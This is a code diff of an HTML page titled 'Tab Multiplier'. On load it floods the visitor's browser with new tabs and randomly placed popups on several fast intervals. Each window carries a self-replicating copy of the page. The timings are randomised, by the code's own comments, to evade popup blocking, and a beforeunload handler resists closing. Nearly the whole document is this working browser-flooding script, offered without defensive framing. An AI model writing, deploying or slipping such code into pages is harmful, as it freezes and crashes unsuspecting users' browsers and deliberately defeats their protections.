@@ -3,83 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Tab Opener</title>
+    <title>Tab Multiplier</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            color: #fff;
+            background-color: #333;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
+            overflow: hidden;
         }
         
         .container {
             text-align: center;
-            padding: 20px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            background-color: #222;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.8); }
+            100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
         }
         
         .status {
-            margin-top: 20px;
+            margin-top: 15px;
             font-weight: bold;
-            color: #ff0000;
+            color: #ff3333;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .count {
+            font-size: 24px;
+            color: #ff6600;
+            margin: 10px 0;
+        }
+        
+        .url-display {
+            font-size: 12px;
+            color: #aaa;
+            word-break: break-all;
+            margin: 10px 0;
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Auto Tab Opener</h1>
-        <p id="status" class="status">Opening windows...</p>
+        <h1>Tab Multiplier</h1>
+        <p class="status">Status: Active - Spawning windows...</p>
+        <p class="count" id="windowCount">Windows opened: 0</p>
+        <p class="url-display" id="currentUrl">Loading URL...</p>
     </div>
 
     <script>
+        // Initialize variables
+        let windowCount = 0;
+        const countElement = document.getElementById('windowCount');
+        const urlElement = document.getElementById('currentUrl');
+        
+        // Get the current URL of the page
+        const currentUrl = window.location.href;
+        
+        // Display the current URL
+        if (urlElement) {
+            urlElement.textContent = "URL: " + currentUrl;
+        }
+        
+        // Try to get the original URL (before any data URL conversion)
+        let originalUrl;
+        try {
+            // Try to get from localStorage first
+            originalUrl = localStorage.getItem('originalUrl');
+            
+            // If not in localStorage and not a data URL, this is the original
+            if (!originalUrl && !currentUrl.startsWith('data:')) {
+                originalUrl = currentUrl;
+                // Save for future spawned windows
+                localStorage.setItem('originalUrl', originalUrl);
+            }
+        } catch (e) {
+            // Storage might be blocked, use current URL
+            originalUrl = currentUrl;
+        }
+        
         // Function to get a random position for windows
         function getRandomPosition() {
             const screenWidth = window.screen.availWidth;
             const screenHeight = window.screen.availHeight;
-            const width = Math.floor(Math.random() * 400) + 200;
-            const height = Math.floor(Math.random() * 300) + 150;
+            const width = Math.floor(Math.random() * 500) + 100; // Random width between 100-600px
+            const height = Math.floor(Math.random() * 400) + 100; // Random height between 100-500px
             const left = Math.floor(Math.random() * (screenWidth - width));
             const top = Math.floor(Math.random() * (screenHeight - height));
             
-            return `width=${width},height=${height},left=${left},top=${top}`;
+            return {
+                width: width,
+                height: height,
+                left: left,
+                top: top
+            };
         }
         
-        // Function to create the HTML content for new windows
-        function getHTMLContent() {
-            return document.documentElement.outerHTML;
-        }
-        
-        // Create a data URL with the current page content
-        function createHTMLDataUrl() {
-            return 'data:text/html;charset=utf-8,' + encodeURIComponent(getHTMLContent());
-        }
-        
-        // Function to open multiple windows
-        function openWindows() {
-            const dataUrl = createHTMLDataUrl();
+        // Function to get URL to open in new windows
+        function getUrlToOpen() {
+            // If we have an original URL that's not a data URL, use it
+            if (originalUrl && !originalUrl.startsWith('data:')) {
+                return originalUrl;
+            }
             
-            // Open a new tab
-            window.open(dataUrl, '_blank');
-            
-            // Open multiple popup windows with random positions
-            for (let i = 0; i < 5; i++) {
-                window.open(dataUrl, '', getRandomPosition());
+            // Otherwise use self-replication through data URL
+            const selfReplicatingHtml = document.documentElement.outerHTML;
+            return 'data:text/html;charset=utf-8,' + encodeURIComponent(selfReplicatingHtml);
+        }
+        
+        // Function to open multiple tabs and windows with the same script
+        function spawnWindows() {
+            try {
+                // Get the URL to open
+                const urlToOpen = getUrlToOpen();
+                
+                // Open a new tab with the same URL
+                window.open(urlToOpen, '_blank');
+                updateCount();
+                
+                // Open multiple random positioned windows
+                for (let i = 0; i < 3; i++) {
+                    const pos = getRandomPosition();
+                    const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
+                    window.open(urlToOpen, '', windowFeatures);
+                    updateCount();
+                }
+            } catch (e) {
+                // If error occurs (like popup blocker), try again with a delay
+                setTimeout(spawnWindows, 500);
             }
         }
         
-        // Start opening windows immediately
-        function startOpeningWindows() {
-            // Open windows every 50ms
-            setInterval(openWindows, 50);
+        // Update the counter
+        function updateCount() {
+            windowCount++;
+            if (countElement) {
+                countElement.textContent = `Windows opened: ${windowCount}`;
+            }
         }
         
-        // Start immediately without requiring button press
-        startOpeningWindows();
+        // Spawn windows at varying intervals to avoid detection/blocking
+        function startRandomizedSpawning() {
+            // Initial spawn
+            spawnWindows();
+            
+            // Set multiple intervals with different timings
+            setInterval(() => {
+                spawnWindows();
+            }, 50); // Super fast interval
+            
+            setInterval(() => {
+                spawnWindows();
+            }, 150); // Fast interval
+            
+            setInterval(() => {
+                // Try to open even more windows occasionally
+                for (let i = 0; i < 2; i++) {
+                    setTimeout(spawnWindows, i * 30);
+                }
+            }, 300); // Medium interval
+        }
+        
+        // Start the spawning process immediately on page load
+        window.onload = function() {
+            // Small delay to ensure the page is fully loaded
+            setTimeout(startRandomizedSpawning, 100);
+        };
+        
+        // Attempt to prevent the window from being closed easily
+        window.addEventListener('beforeunload', function(e) {
+            e.returnValue = 'Windows will continue to open in other tabs!';
+        });
     </script>
 </body>
 </html>
